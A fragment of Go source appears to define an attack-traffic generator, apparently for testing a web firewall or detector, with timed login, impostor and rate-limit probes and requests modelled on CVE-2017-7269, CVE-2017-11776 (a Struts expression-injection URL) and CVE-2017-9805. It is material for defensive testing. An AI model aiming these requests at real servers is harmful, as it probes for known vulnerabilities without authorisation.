...
func (p *program) Start(s service.Service) error {
	...
	authSuc = Attack{name: "AuthSuc", method: "POST", maxNap: 240, minNap: 1, pause: 4, maxRequests: 20,
		minRequests: 10, url: fmt.Sprintf("http://%s/login", target), body: strings.NewReader(`userName=user1&password=User1_123&csrf=`),
		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"}}
	...
	impostor = Attack{name: "Impostor", method: "GET", maxNap: 30, minNap: 1, pause: 3,
	...
	ratelimit = Attack{name: "RateLimit", method: "GET", maxNap: 30, minNap: 1, pause: 3,
	...
	cve20177269  = Attack{name: "cve20177269", method: "PROPFIND", maxNap: 10, minNap: 1, pause: 1,
		maxRequests: 10, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
	...
	cve201711776 = Attack{name: "cve201711776", method: "GET", maxNap: 10, minNap: 1, pause: 1,
		maxRequests: 10, minRequests: 2, url: fmt.Sprintf("http://%s/struts2-showcase/%24%7B%28111%2B111%29%7D/actionChain1.action", target),
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"}}
	cve20179805  = Attack{name: "cve20179805", method: "POST", maxNap: 10, minNap: 2, pause: 1,
